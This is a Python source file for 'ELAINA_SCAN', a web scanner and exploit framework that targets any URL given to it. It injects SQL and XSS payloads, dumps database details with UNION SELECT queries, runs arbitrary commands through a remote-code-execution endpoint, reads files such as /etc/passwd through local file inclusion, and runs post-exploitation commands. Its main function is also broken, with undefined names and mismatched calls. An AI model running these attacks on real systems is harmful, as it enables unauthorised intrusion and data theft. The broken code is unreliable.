import random, argparse, requests, urllib.parse, concurrent.futures, subprocess, json, colorama
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style

init(autoreset=True)
results = []

def banner():
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    color = random.choice(colors)
    print(color + Style.BRIGHT + """
 ███████╗██╗      █████╗ ██╗███╗   ██╗ █████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
 ██╔════╝██║     ██╔══██╗██║████╗  ██║██╔══██╗    ██╔════╝██╔════╝██╔══██╗████╗  ██║
 █████╗  ██║     ███████║██║██╔██╗ ██║███████║    ███████╗██║     ███████║██╔██╗ ██║
 ██╔══╝  ██║     ██╔══██║██║██║╚██╗██║██╔══██║    ╚════██║██║     ██╔══██║██║╚██╗██║
 ███████╗███████╗██║  ██║██║██║ ╚████║██║  ██║    ███████║╚██████╗██║  ██║██║ ╚████║
 ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
                    Web Vulnerability Scanner - by YURI08
"""   + Style.RESET_ALL)                        
    
def print_result(msg, level="info"):
    level_colors = {
        "info": Fore.CYAN + Style.BRIGHT,
        "success": Fore.GREEN + Style.BRIGHT,
        "warn": Fore.YELLOW + Style.BRIGHT,
        "error": Fore.RED + Style.BRIGHT
    }
    color = level_colors.get(level, Fore.WHITE + Style.BRIGHT)
    tag = f"[{level.upper()}]"

    if level == "error":
        line = "=" * (len(msg) + len(tag) + 3)
        print(f"{color}{line}")
        print(f"{color}{tag} {msg}")
        print(f"{color}{line}")
    else:
        print(f"{color}{tag} {msg}") 
def load_payloads(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Payload error: {e}")
        return []

def parse_params(url):
    return list(urllib.parse.parse_qs(urllib.parse.urlparse(url).query).keys())

def build_url(base_url, param, payload):
    parsed = list(urllib.parse.urlparse(base_url))
    query = dict(urllib.parse.parse_qsl(parsed[4]))
    query[param] = payload
    parsed[4] = urllib.parse.urlencode(query)
    return urllib.parse.urlunparse(parsed)

def request(url, proxy=None):
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None
        return requests.get(url, timeout=5, proxies=proxies)
    except:
        return None

def try_sql_dump(base_url, param, proxy):
    def dump(payload):
        u = build_url(base_url, param, payload)
        r = request(u, proxy)
        if r:
            print(f"[DUMP] {payload} => {r.text[:100].strip()}")
            results.append({"mode": "sql-dump", "url": u, "result": r.text[:100]})
    print("[*] Attempting SQLi basic data dump...")
    dump("1' UNION SELECT null,@@version-- -")
    dump("1' UNION SELECT null,database()-- -")

def scan_payload(url, param, payload, mode, proxy):
    target_url = build_url(url, param, payload)
    r = request(target_url, proxy)
    if not r: return
    result = {"mode": mode, "url": target_url, "payload": payload, "vulnerable": False}

    if mode == "sql":
        if any(e in r.text.lower() for e in ["mysql", "syntax", "odbc", "sql error"]):
            print(f"[SQLi] {target_url}")
            result["vulnerable"] = True
            results.append(result)
            try_sql_dump(url, param, proxy)

    elif mode == "xss" and payload.strip('<>"') in r.text:
        print(f"[XSS] {target_url}")
        result["vulnerable"] = True
        results.append(result)

def csrf_check(url, proxy):
    r = request(url, proxy)
    if r and "<form" in r.text and "csrf" not in r.text.lower():
        print(f"[CSRF] Possible missing CSRF token: {url}")
        results.append({"mode": "csrf", "url": url, "vulnerable": True})

def nuclei_scan(url):
    try:
        print(f"[NUCLEI] Scanning {url}...")
        subprocess.run(["nuclei", "-u", url], check=True)
    except Exception as e:
        print(f"[!] Nuclei error: {e}")

def run_mode(mode, url, payloads, threads, proxy, fuzz_all):
    params = parse_params(url)
    targets = params if fuzz_all else params[:1]

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for param in targets:
            for payload in payloads:
                executor.submit(scan_payload, url, param, payload, mode, proxy)

def run_full_scan(args):
    for m in ["sql", "xss", "csrf", "nuclei"]:
        args.mode = m
        run_scan(args)

def run_scan(args):
    if args.mode == "fullscan":
        run_full_scan(args)
        return
    if args.mode == "csrf":
        csrf_check(args.url, args.proxy)
        return
    if args.mode == "nuclei":
        nuclei_scan(args.url)
        return
    if not args.payload:
        print("[!] You must provide a --payload file for SQL/XSS modes.")
        return
    payloads = load_payloads(args.payload)
    run_mode(args.mode, args.url, payloads, args.thread, args.proxy, args.fuzz_params)

# ===== Exploit & Post Exploit =====

def exploit_rce(url, cmd, proxy):
    payload = urllib.parse.quote(cmd)
    target_url = f"{url}{payload}"
    r = request(target_url, proxy)
    if r:
        print(f"[RCE] Response:\n{r.text}")
        results.append({"mode": "rce", "url": target_url, "output": r.text[:300]})

def exploit_lfi(url, file_path, proxy):
    payload = urllib.parse.quote(file_path)
    target_url = f"{url}{payload}"
    r = request(target_url, proxy)
    if r:
        print(f"[LFI] Content from {file_path}:\n{r.text[:300]}")
        results.append({"mode": "lfi", "url": target_url, "output": r.text[:300]})

def exploit_upload():
    print("[!] Upload exploit not implemented.")

def post_exploit_rce(url, proxy):
    for cmd in ["whoami", "id", "uname -a"]:
        print(f"\n[POST-RCE] Running: {cmd}")
        exploit_rce(url, cmd, proxy)

def run_exploit(args):
    if args.exploit == "rce":
        exploit_rce(args.url, args.cmd or "whoami", args.proxy)
    elif args.exploit == "lfi":
        exploit_lfi(args.url, args.file or "/etc/passwd", args.proxy)
    elif args.exploit == "upload":
        exploit_upload()
    else:
        print("[!] Unsupported exploit.")

def run_post(args):
    if args.exploit == "rce":
        post_exploit_rce(args.url, args.proxy)
    else:
        print("[!] Post-exploit only supports RCE.")

def save_results(path):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2)
        print(f"[+] Results saved to: {path}")
    except Exception as e:
        print(f"[!] Failed to save results: {e}")

def main():
    banner()
    parser = argparse.ArgumentParser(description="ELAINA_SCAN - Vuln/Exploit Framework")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-m", "--mode", required=True, help="Mode: sql, xss, csrf, nuclei, fullscan, exploit, post")
    parser.add_argument("-payload", help="Payload file path")
    parser.add_argument("-thread", type=int, default=5, help="Thread count")
    parser.add_argument("-proxy", help="Proxy (http://127.0.0.1:8080)")
    parser.add_argument("--fuzz-params", action="store_true", help="Fuzz all query params")
    parser.add_argument("--output", help="Save results to JSON")
    parser.add_argument("--exploit", help="Exploit type: rce, lfi, upload")
    parser.add_argument("--cmd", help="Command for RCE")
    parser.add_argument("--file", help="File to read (LFI)")
    parser.add_argument("--payload", required=True, help="Payload file path")
    args = parser.parse_args()
    
    print(BANNER)
    args = parse_args()
    run_scan(args.url, args.mode, args.payload, args.threads, args.proxy)
    if args.mode == "exploit":
        run_exploit(args)
    elif args.mode == "post":
        run_post(args)
    else:
        run_scan(args)

    if args.output:
        save_results(args.output)

if __name__ == "__main__":
    main()
